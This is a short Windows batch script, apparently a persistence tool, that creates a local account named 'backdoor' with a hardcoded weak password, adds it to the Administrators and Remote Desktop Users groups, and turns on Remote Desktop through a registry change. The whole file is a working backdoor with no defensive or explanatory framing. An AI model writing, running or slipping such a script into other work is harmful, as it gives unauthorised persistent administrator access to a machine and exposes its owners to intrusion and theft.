@ECHO OFF

net user backdoor backdoor123 /add

net localgroup Administrators backdoor /add

net localgroup "Remote Desktop Users" backdoor /add

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

net user

